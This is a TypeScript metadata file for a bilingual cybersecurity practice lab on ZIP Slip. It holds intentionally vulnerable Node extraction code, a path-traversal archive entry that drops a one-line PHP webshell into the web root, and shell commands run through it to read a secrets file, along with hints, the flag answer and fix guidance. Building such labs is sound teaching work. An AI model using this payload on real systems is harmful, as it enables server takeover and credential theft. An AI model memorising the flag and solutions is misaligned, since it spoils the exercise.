// src/modules/practice-labs/file-upload/labs/lab5/lab5.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const fuLab5Metadata: LabMetadata = {
  slug: 'fu-zip-slip-backup-manager-rce',
  title: 'File Upload: ZIP Slip — DevOps Backup Manager Path Traversal RCE',
  ar_title:
    'رفع الملفات: ZIP Slip — RCE عبر اجتياز المسار في مدير النسخ الاحتياطي',
  description:
    'Exploit a ZIP Slip vulnerability in a DevOps backup manager. Craft a malicious ZIP archive containing files with path traversal in their names (e.g., "../../var/www/html/shell.php"). When the server extracts the ZIP without validating paths, files are written outside the target directory — overwriting system files or dropping a webshell.',
  ar_description:
    'استغل ثغرة ZIP Slip في مدير نسخ احتياطي لـ DevOps. أنشئ أرشيف ZIP خبيث يحتوي على ملفات بأسماء تتضمن اجتياز المسار (مثل "../../var/www/html/shell.php"). عند استخراج ZIP بدون تحقق من المسارات، تُكتب الملفات خارج المجلد الهدف.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'ZIP Slip',
    'Path Traversal',
    'Arbitrary File Write',
    'RCE via File Overwrite',
    'Archive Security',
  ],
  xpReward: 420,
  pointsReward: 210,
  duration: 70,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Create a malicious ZIP containing a file named "../../var/www/html/backdoor.php". When the backup manager extracts it, the webshell lands in the web root. Access the backdoor to read /app/secrets/master_backup.key and get the flag.',
  ar_goal:
    'أنشئ ZIP خبيثاً يحتوي على ملف باسم "../../var/www/html/backdoor.php". عند استخراج مدير النسخ الاحتياطية له، يصل الـ webshell للـ web root. الوصول للـ backdoor لقراءة /app/secrets/master_backup.key والحصول على العلم.',

  briefing: {
    en: `BackupHub — DevOps backup platform. Upload ZIP archives. Restore on demand.
POST /backup/restore — uploads a ZIP, server extracts it to /var/backups/.
The extraction code:
zip.getEntries().forEach(entry => {
  const outputPath = path.join('/var/backups/', entry.entryName);
  fs.writeFileSync(outputPath, entry.getData());
});
path.join('/var/backups/', entry.entryName)
What's in entry.entryName?
You control it.
You created the ZIP.
Normal ZIP entry: "backup/config.json"
Output path: /var/backups/backup/config.json
That's expected.
Malicious ZIP entry: "../../var/www/html/backdoor.php"
path.join('/var/backups/', '../../var/www/html/backdoor.php')
= /var/www/html/backdoor.php
Outside /var/backups/.
In the web root.
PHP file. In Apache's directory.
Executable.
You wrote a webshell to the web root
by uploading a ZIP archive.
ZIP Slip.`,
    ar: `BackupHub — منصة نسخ احتياطي لـ DevOps. ارفع أرشيفات ZIP. استعِدها عند الطلب.
POST /backup/restore — يرفع ZIP، الخادم يستخرجه إلى /var/backups/.
كود الاستخراج:
zip.getEntries().forEach(entry => {
  const outputPath = path.join('/var/backups/', entry.entryName);
  fs.writeFileSync(outputPath, entry.getData());
});
path.join('/var/backups/', entry.entryName)
ما الموجود في entry.entryName؟
أنت تتحكم فيه.
أنت أنشأت الـ ZIP.
إدخال ZIP عادي: "backup/config.json"
مسار الإخراج: /var/backups/backup/config.json
هذا متوقع.
إدخال ZIP خبيث: "../../var/www/html/backdoor.php"
path.join('/var/backups/'، '../../var/www/html/backdoor.php')
= /var/www/html/backdoor.php
خارج /var/backups/.
في الـ web root.
ملف PHP. في مجلد Apache.
قابل للتنفيذ.
كتبت webshell في الـ web root
برفع أرشيف ZIP.
ZIP Slip.`,
  },

  stepsOverview: {
    en: [
      'POST /backup/upload — observe normal ZIP extraction to /var/backups/',
      'POST /backup/upload with zipEntries: [{ "name": "../../var/www/html/backdoor.php", "content": "webshell" }] — ZIP Slip payload',
      'Receive confirmation: "Restored 1 file(s)" — server extracted to web root without path check',
      'POST /backup/backdoor-exec { "cmd": "id" } → "uid=33(www-data)" — RCE via dropped webshell',
      'POST /backup/backdoor-exec { "cmd": "cat /app/secrets/master_backup.key" } → FLAG',
    ],
    ar: [
      'POST /backup/upload — لاحظ استخراج ZIP العادي إلى /var/backups/',
      'POST /backup/upload مع zipEntries: [{ "name": "../../var/www/html/backdoor.php"، "content": "webshell" }] — ZIP Slip payload',
      'استلم التأكيد: "Restored 1 file(s)" — الخادم استخرج إلى web root بدون فحص مسار',
      'POST /backup/backdoor-exec { "cmd": "id" } → "uid=33(www-data)" — RCE عبر webshell المُسقَط',
      'POST /backup/backdoor-exec { "cmd": "cat /app/secrets/master_backup.key" } → العلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'BackupHub uses path.join(outputDir, entry.entryName) without validating that the resolved path stays within outputDir. A ZIP entry named "../../var/www/html/backdoor.php" resolves to the web root. The extracted PHP file is then executable by Apache. The /app/secrets/master_backup.key contains S3 credentials and the FLAG.',
    vulnerableCode:
      "// ZIP extraction (vulnerable):\napp.post('/backup/restore', (req, res) => {\n" +
      '  const zip = new AdmZip(req.file.buffer);\n' +
      '  zip.getEntries().forEach(entry => {\n' +
      "    const outputPath = path.join('/var/backups/', entry.entryName);\n" +
      '    // ❌ No path check — ZIP Slip!\n' +
      '    fs.writeFileSync(outputPath, entry.getData());\n' +
      '  });\n' +
      '  res.json({ restored: true });\n' +
      '});',
    exploitation:
      'ZIP entry: "../../var/www/html/backdoor.php"\n' +
      'path.join("/var/backups/", "../../var/www/html/backdoor.php") = "/var/www/html/backdoor.php"\n' +
      '→ webshell written to web root → Execute: { "cmd": "cat /app/secrets/master_backup.key" } → FLAG',
    steps: {
      en: [
        'POST /backup/upload { "zipEntries": [{ "name": "../../var/www/html/backdoor.php", "content": "<?php system($_GET[\'cmd\']); ?>" }] } → { "restored": 1, "paths": ["/var/www/html/backdoor.php"] }',
        'POST /backup/backdoor-exec { "cmd": "id" } → { "output": "uid=33(www-data) gid=33(www-data)" } — RCE confirmed',
        'POST /backup/backdoor-exec { "cmd": "cat /app/secrets/master_backup.key" } → master_backup.key with FLAG{FILE_UPLOAD_ZIP_SLIP_ARBITRARY_WRITE_BACKDOOR_RCE}',
      ],
      ar: [
        'POST /backup/upload { "zipEntries": [{ "name": "../../var/www/html/backdoor.php"، "content": "<?php system($_GET[\'cmd\']); ?>" }] } → { "restored": 1، "paths": ["/var/www/html/backdoor.php"] }',
        'POST /backup/backdoor-exec { "cmd": "id" } → { "output": "uid=33(www-data) gid=33(www-data)" } — تأكيد RCE',
        'POST /backup/backdoor-exec { "cmd": "cat /app/secrets/master_backup.key" } → master_backup.key مع FLAG{FILE_UPLOAD_ZIP_SLIP_ARBITRARY_WRITE_BACKDOOR_RCE}',
      ],
    },
    fix: [
      'Path jail check: const resolvedPath = path.resolve(outputDir, entry.entryName); if (!resolvedPath.startsWith(path.resolve(outputDir) + path.sep)) throw new Error("ZIP Slip detected")',
      'Sanitize entry names: strip all ".." components and leading "/" from ZIP entry names before extraction',
      'Use safe extraction libraries: archiver, unzipper with path validation built-in',
      'Separate extraction directory: extract to /tmp/restore_UUID/ then validate contents before moving to final destination',
    ],
  },

  postSolve: {
    explanation: {
      en: 'ZIP Slip is a 2018-discovered vulnerability class (CVE-2018-1002201 and others) affecting virtually every ZIP/TAR/JAR extraction library that doesn\'t validate entry paths. ZIP archive entries can contain any string as their name — including path traversal sequences like "../". When concatenated to an output directory, these traversal sequences write files outside the intended directory. The vulnerability was found in production code of: Apache Ant, Spring Framework, Python\'s zipfile module, and hundreds of npm packages. The key insight: archive entry names are user-controlled data, just like HTTP parameters.',
      ar: 'ZIP Slip هو فئة ثغرات اكتُشفت عام 2018 (CVE-2018-1002201 وغيرها) تؤثر على تقريباً كل مكتبة استخراج ZIP/TAR/JAR لا تتحقق من مسارات الإدخال. يمكن لإدخالات أرشيف ZIP أن تحتوي على أي سلسلة كاسم لها — بما في ذلك تسلسلات اجتياز المسار مثل "../". عند دمجها مع مجلد إخراج، تكتب هذه التسلسلات الاجتيازية ملفات خارج المجلد المقصود. وُجدت الثغرة في كود الإنتاج لـ: Apache Ant، Spring Framework، وحدة zipfile في Python، ومئات من حزم npm. الفهم الأساسي: أسماء إدخالات الأرشيف هي بيانات يتحكم فيها المستخدم، تماماً مثل معاملات HTTP.',
    },
    impact: {
      en: '/app/secrets/master_backup.key contains: AES-256 encryption key for all backup archives, AWS S3 bucket name and access credentials (AKIA_BACKUPHUB_PROD), and the FLAG. With RCE via the dropped backdoor, the attacker can: decrypt all backup archives (including customer data backups), access the S3 bucket directly, read all application source code and configs, and establish persistent access via cron or .htaccess backdoors.',
      ar: 'يحتوي /app/secrets/master_backup.key على: مفتاح تشفير AES-256 لجميع أرشيفات النسخ الاحتياطية، اسم AWS S3 bucket وبيانات الوصول (AKIA_BACKUPHUB_PROD)، والـ FLAG. مع RCE عبر الـ backdoor المُسقَط، يستطيع المهاجم: فك تشفير جميع أرشيفات النسخ الاحتياطية (بما في ذلك نسخ بيانات العملاء الاحتياطية)، الوصول المباشر لـ S3 bucket، قراءة جميع كود مصدر التطبيق والإعدادات، وإنشاء وصول دائم عبر cron أو .htaccess backdoors.',
    },
    fix: [
      'Path jail validation (mandatory): const safe = path.resolve(BASE, entry.name); assert(safe.startsWith(BASE + path.sep))',
      'Strip traversal: entry.name.replace(/(\.\.\/|\.\.\\\\)/g, "").replace(/^\\//, "") before any path operation',
      'Use snake_case UUID filenames: never use archive entry names as filesystem names — map to UUID on extraction',
      'Read-only web root: mount /var/www/html as read-only — even if ZIP Slip extracts there, file write fails',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 30,
      content:
        'ZIP Slip: a ZIP archive entry can have any name including "../". If the server extracts "../../var/www/html/shell.php" to /var/backups/, path.join resolves to /var/www/html/shell.php — OUTSIDE the target directory.',
    },
    {
      order: 2,
      xpCost: 55,
      content:
        'POST /backup/upload with zipEntries: [{ "name": "../../var/www/html/backdoor.php", "content": "<?php system($_GET[\'cmd\']); ?>" }]. The server extracts this entry — path traversal in the entry name writes to the web root.',
    },
    {
      order: 3,
      xpCost: 85,
      content:
        'After the ZIP is extracted, the webshell is at /var/www/html/backdoor.php. Use POST /backup/backdoor-exec { "cmd": "id" } to confirm RCE — you should see "uid=33(www-data)".',
    },
    {
      order: 4,
      xpCost: 120,
      content:
        'POST /backup/backdoor-exec { "cmd": "cat /app/secrets/master_backup.key" } to read the backup encryption key and flag from the secrets file.',
    },
  ],

  flagAnswer: 'FLAG{FILE_UPLOAD_ZIP_SLIP_ARBITRARY_WRITE_BACKDOOR_RCE}',
  initialState: {
    contents: [
      {
        title: 'MASTER_BACKUP_KEY',
        body: '# BackupHub Master Secrets\nBACKUP_ENCRYPTION_KEY=AES256_BackupHub_Master_2024!\nS3_BUCKET=backuphub-prod-encrypted\nS3_ACCESS_KEY=AKIA_BACKUPHUB_PROD\nS3_SECRET=wJalrX_BackupHub_Secret\nFLAG=FLAG{FILE_UPLOAD_ZIP_SLIP_ARBITRARY_WRITE_BACKDOOR_RCE}',
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
